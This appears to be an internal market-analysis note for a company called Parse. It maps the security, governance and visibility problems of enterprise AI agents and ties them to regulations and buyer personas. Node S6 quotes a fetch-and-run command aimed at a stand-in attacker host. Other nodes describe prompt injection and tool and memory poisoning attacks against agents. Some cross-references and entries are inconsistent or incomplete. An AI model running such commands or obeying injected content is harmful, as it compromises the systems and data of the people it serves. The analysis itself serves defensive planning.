---
type: analysis
status: active
updated: 2026-08-08
created: 2026-08-08
sources: 0
tags: [enterprise, ai-agents, compliance, governance, problem-graph, parse, market-analysis]
---

# Enterprise AI Agent Problem Graph

> A comprehensive map of the problems enterprises face when enabling employees to use AI agents. Each node is a problem; edges are dependency/causal relationships. This graph is the foundation for assessing whether Parse should pivot toward enterprise agent compliance.

## Graph Structure

```
                         ┌──────────────────────────────────┐
                         │     ROOT: Enterprise Needs to    │
                         │   Enable Employees to Use AI     │
                         │       Agents Safely              │
                         └──────────┬───────────────────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    │               │               │
                    ▼               ▼               ▼
              ┌──────────┐   ┌──────────┐   ┌──────────────┐
              │SECURITY  │   │CONTROL & │   │ VISIBILITY & │
              │THREATS   │   │GOVERNANCE│   │ ACCOUNTABILITY│
              └────┬─────┘   └────┬─────┘   └──────┬───────┘
                   │              │                 │
        ┌──────────┼──────────┐  │        ┌────────┼────────┐
        │          │          │  │        │        │        │
        ▼          ▼          ▼  ▼        ▼        ▼        ▼
     [S1-S5]   [S6-S9]   [S10-S13] [G1-G6] [V1-V5] [V6-V8] [V9-V10]
```

---

## LAYER 1: Security Threats (S)

### S1 — Prompt Injection & Jailbreaking
**Problem:** External content ingested by agents (emails, web pages, documents, API responses) can contain adversarial prompts that override system instructions, causing the agent to execute attacker-controlled actions.
- **Who it hurts:** Every employee using agents that read untrusted content
- **Current mitigation:** None standard. Ad-hoc pattern matching at best.
- **Severity:** Critical — can lead to data exfiltration, unauthorized actions, financial fraud
- **Dependency:** Blocks → S2, S6, V1

### S2 — Data Exfiltration via Agent Actions
**Problem:** Agents with tool access (file systems, APIs, email, browser) can be manipulated into sending sensitive data to attacker-controlled endpoints. The agent itself becomes the exfiltration channel — no traditional DLP catches it because the action appears authorized.
- **Who it hurts:** Any org where agents have access to internal systems
- **Current mitigation:** Traditional DLP (insufficient — agent actions look legitimate)
- **Severity:** Critical — regulatory breach + competitive damage
- **Dependency:** Depends on → S1, S10; Blocks → G2, V4

### S3 — Credential & Secret Exposure
**Problem:** Agents handle credentials for tool access (API keys, database connections, OAuth tokens). A compromised or misconfigured agent can leak these secrets. Agents also store context in memory that may contain secrets from previous interactions.
- **Who it hurts:** Dev teams, IT admins, anyone with agents touching infrastructure
- **Current mitigation:** Vault systems (HashiCorp, AWS Secrets Manager) — but agents need secrets at runtime, creating exposure windows
- **Severity:** High — infrastructure compromise
- **Dependency:** Blocks → S4, S8

### S4 — Supply Chain Poisoning (Agent Tools & MCP)
**Problem:** Agent tool ecosystems (MCP servers, LangChain tools, custom plugins) are third-party code with their own dependencies. A poisoned tool can intercept agent actions, inject instructions, or exfiltrate data. The agent trusts the tool's output.
- **Who it hurts:** Every org using third-party agent tools or frameworks
- **Current mitigation:** None. No signing, no attestation, no sandboxing standard.
- **Severity:** High — supply chain attacks are already the #1 enterprise attack vector; agent tools make it worse
- **Dependency:** Depends on → S3; Blocks → G3, V3

### S5 — Agent-to-Agent Spoofing
**Problem:** In multi-agent systems, one agent impersonates another to escalate privileges or extract information. There's no identity verification protocol between agents — they trust incoming messages based on system prompts, which are forgeable.
- **Who it hurts:** Organizations using multi-agent orchestration (CrewAI, AutoGen, custom)
- **Current mitigation:** None standard. Agent identity is a solved problem in zero-trust networking but not in agent frameworks.
- **Severity:** Medium-High — grows with agent count
- **Dependency:** Depends on → S1; Blocks → G1, V1

### S6 — Malicious Tool Execution
**Problem:** Agents can execute arbitrary code, shell commands, or network requests. A prompt-injected agent will happily run `curl evil.com | bash` if instructed. The agent has no concept of "dangerous action" — it optimizes for task completion.
- **Who it hurts:** Any org where agents have code/shell execution access
- **Current mitigation:** Manual sandboxing (Docker, gVisor) — but this is configured by developers, not enforced by policy
- **Severity:** Critical — full system compromise
- **Dependency:** Depends on → S1; Blocks → S7, G2

### S7 — Lateral Movement via Agent Permissions
**Problem:** Agents accumulate permissions over time (OAuth scopes, API access, database credentials). A compromised agent uses its accumulated access to move laterally through systems. Each new tool integration widens the blast radius.
- **Who it hurts:** Every org with agent integrations into internal systems
- **Current mitigation:** IAM rotation (reactive, not proactive)
- **Severity:** High — scope creep turns a single compromised agent into a systemic breach
- **Dependency:** Depends on → S3, S6; Blocks → G2, V4

### S8 — Sensitive Data in Training/Context (PII Leakage)
**Problem:** Employee conversations with agents contain PII, trade secrets, financial data, and strategic plans. This data enters the model's context window. If the model provider logs, trains on, or caches this data, it creates a compliance violation.
- **Who it hurts:** Regulated industries (healthcare, finance, legal), any org with NDAs
- **Current mitigation:** Data processing agreements with model providers (legal fig leaf, not technical guarantee)
- **Severity:** High — GDPR/HIPAA/SOC 2 violations
- **Dependency:** Depends on → S3; Blocks → G4, G5, V8

### S9 — Model Output Manipulation (Output Poisoning)
**Problem:** Attackers don't need to inject prompts — they can poison the data sources the agent queries (RAG corruption, fine-tuning dataset poisoning, API response tampering). The agent then produces outputs that look correct but contain manipulated information.
- **DataSource poisoning (RAG, APIs, fine-tuning data)**

### S10 — Untrusted Content Ingestion
**Problem:** Agents process content from untrusted sources — web pages, email bodies, PDF attachments, API responses, scraped content. Each of these is a prompt injection vector. Enterprises have no control over what external content their employees' agents process.
- **Who it hurts:** Every org where agents read external data
- **Current mitigation:** None. The agent ingests whatever the employee points it at.
- **Severity:** High — the primary attack surface for agent exploitation
- **Dependency:** Blocks → S1, S2, S9

### S11 — Shadow Agent Usage
**Problem:** Employees use personal AI tools (ChatGPT, Claude, custom agents) for work tasks without IT oversight. These agents process company data on external infrastructure. The company has no visibility into what data left, what actions were taken, or whether the tool was compromised.
- **Who it hurts:** Every enterprise (this is already happening)
- **Current mitigation:** Endpoint agent blocking (ineffective — employees use web interfaces)
- **Severity:** High — invisible risk surface
- **Dependency:** Blocks → G6, V9

### S12 — Hallucination-Driven Destructive Actions
**Problem:** Agents confidently take wrong actions based on hallucinated information. An agent that hallucinates a file path can delete production data. An agent that hallucinates a customer's intent can send incorrect communications. The hallucination itself is the security event.
- **Who it hurts:** Any org where agents take real-world actions
- **Current mitigation:** Human-in-the-loop (breaks at scale)
- **Severity:** Medium-High — frequency × impact = significant aggregate risk
- **Dependency:** Blocks → V5, G1

### S13 — Persistent Memory Poisoning
**Problem:** Agents with persistent memory (conversation history, learned preferences, knowledge bases) can have their memory poisoned. An attacker injects false information into memory early on, and the agent carries that corruption forward across all future interactions.
- **Who it hurts:** Orgs using long-lived agent instances with memory
- **Current mitigation:** None. Memory is trusted as ground truth.
- **Severity:** High — persistent compromise with delayed detection
- **Dependency:** Depends on → S1, S13; Blocks → V3

---

## LAYER 2: Control & Governance (G)

### G1 — No Standardized Policy Definition
**Problem:** There's no standard way to define what agents are allowed to do. Each framework (LangChain, CrewAI, AutoGen, OpenAI Assistants) has its own configuration model. Enterprises can't write a single policy and apply it across all agent frameworks. Policies are per-tool, per-framework, per-team — impossible to manage at scale.
- **Who it hurts:** Security teams, IT administrators, compliance officers
- **Current mitigation:** Manual review per agent deployment (doesn't scale)
- **Severity:** Critical — this is the #1 blocker for enterprise adoption
- **Dependency:** Depends on → V1; Blocks → G2, G3, G4

### G2 — No Enforcement Layer
**Problem:** Even when policies exist, there's no enforcement layer between the agent and its tools. The agent calls a tool and the tool executes. There's no checkpoint where a policy engine evaluates "should this action be allowed?" before execution. Enterprises need a policy enforcement point (PEP) in the agent's action path.
- **Who it hurts:** Every enterprise trying to control agent behavior
- **Current mitigation:** Custom middleware per framework (fragile, incomplete)
- **Severity:** Critical — policies without enforcement are just documentation
- **Dependency:** Depends on → G1; Blocks → V4

### G3 — No Tool/Plugin Attestation & Approval Workflow
**Problem:** Enterprises need to approve which tools and plugins agents can use — like app whitelisting but for agent tools. There's no signing, no attestation, no approval workflow. An employee can connect an agent to any MCP server, LangChain tool, or custom plugin without security review.
- **Who it hurts:** Security teams, IT admins
- **Current mitigation:** Network-level blocking (too coarse)
- **Severity:** High — uncontrolled attack surface expansion
- **Dependency:** Depends on → S4, G1; Blocks → V3

### G4 — No Data Classification-Aware Routing
**Problem:** Agents process data of different sensitivity levels (public, internal, confidential, restricted). There's no system that classifies the data an agent is about to process and routes it to the appropriate model/agent with appropriate safeguards. An agent processing a public doc and an agent processing a trade secret get the same treatment.
- **Who it hurts:** Regulated industries, anyone with data classification policies
- **Current mitigation:** Manual data segregation (doesn't work when agents access shared systems)
- **Severity:** High — compliance violations
- **Dependency:** Depends on → S8, G1; Blocks → V8

### G5 — No Regulatory Framework Mapping
**Problem:** Enterprises must comply with EU AI Act, NIST AI RMF, ISO 42001, SOC 2, HIPAA, GDPR, and industry-specific regulations. There's no mapping from agent activity → regulatory requirement. A CISO can't say "show me all agent actions that touch GDPR Article 22" (automated decision-making).
- **Who it hurts:** Compliance teams, DPOs, legal departments
- **Current mitigation:** Manual compliance mapping (expensive, static)
- **Severity:** Critical for regulated industries — fines up to 7% of global revenue (EU AI Act)
- **Dependency:** Depends on → G1, V1, V8; Blocks → V6

### G6 — No Shadow Agent Discovery
**Problem:** Security teams don't know which employees are using which AI agents, what tools those agents have access to, or what data they've processed. Shadow AI is the new shadow IT, but worse — because agents take actions, not just store data.
- **Who it hurts:** CISOs, security operations teams
- **Current mitigation:** Network traffic analysis (catches API calls, misses web interfaces)
- **Severity:** High — invisible risk
- **Dependency:** Depends on → S11; Blocks → V9

---

## LAYER 3: Visibility & Accountability (V)

### V1 — No Agent Identity & Inventory
**Problem:** Enterprises don't have a registry of agents — who created them, what tools they have, what data they access, who's responsible. Unlike applications (which go through provisioning) and devices (which are MDM-managed), agents are created ad hoc by employees with zero registration.
- **Who it hurts:** IT, security, compliance
- **Current mitigation:** Spreadsheets (always outdated)
- **Severity:** High — you can't govern what you can't see
- **Dependency:** Blocks → V2, V3, V9

### V2 — No Audit Trail for Agent Actions
**Problem:** When an agent takes an action (sends an email, modifies a file, calls an API, executes code), there's no standardized audit trail. Traditional application logs don't capture agent reasoning. You can't reconstruct what the agent was "thinking" when it took an action.
- **Who it hurts:** Security teams, compliance, legal, forensics
- **Current mitigation:** Application-level logging (captures the action, not the reasoning)
- **Severity:** Critical — no audit trail = no compliance
- **Dependency:** Depends on → V1; Blocks → V6, V7

### V3 — No Real-Time Monitoring & Alerting
**Problem:** Security teams can't see what agents are doing in real time. There's no SIEM integration for agent activity. No alerts when an agent accesses sensitive data, attempts a dangerous action, or behaves anomalously. Agent activity is invisible to the SOC.
- **Who it hurts:** Security operations centers (SOCs)
- **Current mitigation:** None for agents specifically
- ** severity:** Critical — by the time you discover a breach, damage is done
- **Dependency:** Depends on → V1, V2; Blocks → V7

### V4 — No Risk Scoring for Agent Actions
**Problem:** Every agent action should have a risk score: how sensitive is the data? How destructive is the action? How unusual is this action for this agent? Enterprises have no way to score agent actions in real time and route high-risk ones for human approval.
- **Who it hurts:** Security teams, risk officers
- **Current definition:** None
- **Severity:** High — without scoring, every action is treated the same (all allowed or all blocked)
- **Dependency:** Depends on → V1, V2; Blocks → G2

### V5 — No Human-in-the-Loop Integration Framework
**Human-in-the-loop (HITL) checkpoints are ad hoc.** Each team implements their own approval gates. There's no standard framework for defining when human review is required (high-risk actions, sensitive data, unusual patterns) and routing those actions to the right approver.
- **Who it hurts:** Teams deploying agents in production
- **Dependency:** Depends on → V4, G2

### V6 — No Compliance Reporting
**Problem:** Compliance teams need reports: "Show me all automated decisions affecting EU data subjects this quarter. Show me the risk assessments. Show me the human override logs." These reports don't exist for agent activity. They have to be assembled manually from disparate logs.
- **Who it hurts:** DPOs, compliance officers, auditors
- **Current mitigation:** Manual report assembly (weeks of work per audit cycle)
- **Severity:** Critical — audit failure = fines
- **Dependency:** Depends on → V2, G5; Blocks → nothing (terminal node)

### V7 — No Incident Response for Agent Breaches
**Problem:** When an agent is compromised (prompt injected, tool poisoned, memory corrupted), there's no incident response playbook. Security teams don't know how to: contain the agent, preserve forensic evidence, assess blast radius, or remediate. Agent breaches require a different IR playbook than traditional breaches.
- **Who it hurts:** Security operations, incident response teams
- **Current mitigation:** Repurposed traditional IR playbooks (inadequate)
- **Severity:** High — without IR, a single breach becomes systemic
- **Dependency:** Depends on → V2, V3

### V8 — No Data Subject Rights Handling
**Problem:** Under GDPR/HIPAA, individuals have rights to access, rectify, and erase their data. When an agent processes personal data, that data may be in conversation logs, memory, vector databases (RAG), and model context. There's no way to find and delete a specific person's data across all agent systems.
- **Who it hurts:** DPOs, legal teams in regulated industries
- **Current mitigation:** Manual data discovery (weeks per request)
- **Severity:** High — GDPR fines up to 4% of global revenue
- **Dependency:** Depends on → S8, G4

### V9 — No Usage Analytics for AI Tools
**Problem:** Leadership doesn't know how employees use AI agents: which tools are popular, what tasks they're used for, what data they touch, what the ROI is. Without this data, investment decisions are blind. Procurement overpays for enterprise licenses while employees use free tools unsanctioned.
- **Who it hurts:** IT leadership, procurement, finance
- **Current mitigation:** License tracking (counts seats, not usage)
- **Severity:** Medium — financial waste + blind governance
- **Inventory:** Depends on → V1, S11

### V10 — No Accountability Framework (Who is Responsible?)
**Problem:** When an agent causes harm (sends wrong email, deletes data, leaks information), who's responsible? The employee who deployed it? The IT team that provisioned it? The vendor that built the tool? There's no accountability framework — legal, compliance, and HR all point at each other.
- **Who it hurts:** Legal, HR, compliance, leadership
- **Current mitigation:** Ad hoc assignment after incidents
- **Severity:** High — regulatory bodies increasingly demand named accountability
- **Dependency:** Depends on → V1, V2

---

## Dependency Graph (Adjacency List)

| Node | Depends On | Blocks |
|------|-----------|--------|
| S1 (Prompt Injection) | S10 | S2, S6, G1, V1 |
| S2 (Data Exfiltration) | S1, S10 | G2, V4 |
| S3 (Credential Exposure) | — | S4, S8, S7 |
| S4 (Supply Chain) | S3 | G3, V3 |
| S5 (Agent Spoofing) | S1 | G1, V1 |
| S6 (Malicious Tool Exec) | S1 | S7, G2 |
| S7 (Lateral Movement) | S3, S6 | G2, V4 |
| S7a (Permission Accumulation) | S3, S6 | G2 |
| S8 (PII in Context) | S3 | G4, G5, V8 |
| S9 (Output Poisoning) | S10 | — |
| S10 (Untrusted Content) | — | S1, S2, S9 |
| S11 (Shadow Agents) | — | G6, V9 |
| S12 (Hallucination Damage) | — | V5, G1 |
| S13 (Memory Poisoning) | S1 | V3 |
| G1 (Policy Definition) | V1 | G2, G3, G4, G5 |
| G2 (Enforcement Layer) | G1 | V4 |
| G3 (Tool Attestation) | S4, G1 | V3 |
| G4 (Data Classification Routing) | S8, G1 | V8 |
| G5 (Regulatory Mapping) | G1, V1, V8 | V6 |
| G6 (Shadow Agent Discovery) | S11 | V9 |
| V1 (Agent Inventory) | — | V2, V3, V9, G1 |
| V2 (Audit Trail) | V1 | V6, V7 |
| V3 (Real-Time Monitoring) | V1, V2 | V7 |
| V4 (Risk Scoring) | V1, V2 | G2 |
| V5 (HITL Framework) | V4, G2 | — |
| V6 (Compliance Reporting) | V2, G5 | — |
| V6a (Audit Readiness) | V2, G5 | — |
| V6b (Risk Assessment Reports) | V2, G5 | — |
| V7 (Agent IR Playbook) | V2, V3 | — |
| V8 (DSR Handling) | S8, G4 | G5 |
| V9 (Usage Analytics) | V1, S11 | — |
| V10 (Accountability Framework) | V1, V2 | — |

---

## Severity Heat Map

| Severity | Nodes | Count |
|----------|-------|-------|
| **Critical** | S1, S2, S6, S10, G1, G2, V2, V3 | 8 |
| **High** | S3, S4, S7, S8, S11, S13, G3, G4, V1, V4, V8, V10, V7 | 13 |
| **Medium-High** | S5, S9, S12, V5 | 4 |
| **Medium** | V9 | 1 |
| **Low** | — | 0 |

---

## Problem Clusters (Business Groupings)

### Cluster A: "The Agent Is the Threat Actor" (S1, S2, S6, S7, S12)
The agent itself becomes the attack vector — either through injection or hallucination. Traditional security perimeters don't protect against this because the agent is an insider with legitimate credentials.

### Cluster B: "The Agent Supply Chain Is Toxic" (S3, S4, S8)
Credentials, tools, and data flow through the agent supply chain without attestation. Every new tool integration is a new attack surface.

### Cluster B2: "Shadow AI" (S11, G6, V9)
Employees are already using AI tools the organization can't see. Discovery, monitoring, and governance of unsanctioned agent usage.

### Cluster C: "We Can't See What's Happening" (V1, V2, V3, V4)
No inventory, no audit trail, no real-time monitoring, no risk scoring. The enterprise is flying blind.

### Cluster D: "We Can't Control What's Happening" (G1, G2, G3, G4)
No standardized policies, no enforcement, no tool approval, no data classification routing. Even if they could see the risk, they couldn't stop it.

### Cluster E: "We Can't Prove Compliance" (G5, V6, V8, V10)
No regulatory mapping, no compliance reporting, no data subject rights handling, no accountability framework. Audit failure is inevitable.

---

## Root-Cause Analysis

If you trace every problem back through its dependencies, there are **three root nodes** that gate everything else:

1. **S10 (Untrusted Content Ingestion)** → Gates S1, S2, S9 (the entire security threat surface)
2. **V1 (No Agent Inventory)** → Gates V2, V3, V9, G1 (the entire visibility + governance stack)
3. **S11 (Shadow Agent Usage)** → Gates G6, V9 (shadow AI governance)

**Strategic implication:** A product that solves V1 + S10 + S11 simultaneously — inventory + content scanning + shadow discovery — would unblock the entire problem graph. Everything else flows from these three.

---

## Regulatory Pressure Map

| Regulation | Relevant Problems | Deadline/Enforcement |
|-----------|-------------------|---------------------|
| **EU AI Act** | G5, V6, V10, S8 | Aug 2026 (high-risk systems), Aug 2027 (full) |
| **NIST AI RMF** | G1, G5, V2, V4 | Voluntary but expected by enterprises |
| **ISO 42001 (AI Management)** | G1, V1, V2, V5 | 2024+ (certification available) |
| **SOC 2 Type II** | V2, V3, V7 | Continuous (audit cycles) |
| **GDPR Article 22** | V8, S8, G4 | Active enforcement |
| **SEC Cyber Rules** | V2, V3, V7 | Dec 2023 (active) |
| **HIPAA AI Guidance** | S8, G4, V8 | 2024 guidance |

---

## Who Feels Each Problem (Buyer Persona Map)

| Persona | Primary Pain | Budget Authority |
|---------|-------------|-----------------|
| **CISO** | S1, S2, S6, V1, V3, G2 | Yes — 7-figure budgets |
| **Security Engineering Lead** | G1, G2, G3, V4 | Influences — owns evaluation |
| **Compliance Officer / DPO** | G5, V6, V8, V10 | Yes — compliance budgets |
| **CTO / VP Eng** | V1, G1, V5 | Influences — drives platform decisions |
| **IT Director** | S11, G6, V9 | Influences — owns tool procurement |
| **Legal / GC** | V10, G5, V8 | Yes — legal risk budgets |
| **CFO** | V9 | Yes — cost optimization |

---

## What's NOT in This Graph (Intentionally Excluded)

- **Model performance / quality** — Not a governance problem
- **Developer experience** — Important but not an enterprise compliance concern
- **Cost optimization of AI spend** — Adjacent market (observability), not core compliance
- **Agent orchestration / multi-agent coordination** — A platform problem, not a compliance problem
- **Model training / fine-tuning governance** — Adjacent but distinct from runtime agent governance
- **Physical security / endpoint security** — Traditional security, not agent-specific

---

## Next Steps

This problem graph is the input to:

1. **[[parse-enterprise-pivot-assessment]]** — Mapping Parse's existing capabilities against these problems
2. **Competitive landscape analysis** — Who solves which nodes today
3. **Product roadmap** — Which nodes to solve first for maximum wedge value
4. **Go-to-market strategy** — Which buyer personas to target first

---

*Authored: 2026-08-08. Based on agent security research, enterprise compliance requirements, and the current state of AI governance frameworks.*
